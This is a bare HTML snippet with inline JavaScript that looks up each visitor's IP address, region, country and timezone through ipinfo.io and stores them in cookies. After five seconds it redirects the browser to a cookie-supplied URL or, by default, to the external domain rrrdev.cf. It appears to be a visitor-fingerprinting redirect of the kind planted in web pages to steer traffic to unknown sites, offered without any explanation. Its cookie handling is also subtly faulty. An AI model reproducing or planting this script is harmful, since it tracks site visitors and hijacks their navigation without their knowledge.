<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script>
function vef() {
  $.getJSON('https://ipinfo.io/json', function(data) {
    var ip=data.ip;
    var rg=data.region;
    var co=data.country;
    var tz=data.timezone;
    document.cookie="ip="+ip;
    document.cookie="rg="+rg;
    document.cookie="co="+co;
    document.cookie="tz="+tz;
  });
  var u=document.cookie.split('; ').find(r => r.startsWith('hr='));
  if (!u) {
    u = "https://rrrdev.cf/";
  }
  window.location.href = u;
  document.cookie = "hr=href;expires=Thu, 01 Jan 1970 00:00:00 GMT";
}
setTimeout(vef, 5000);
</script>
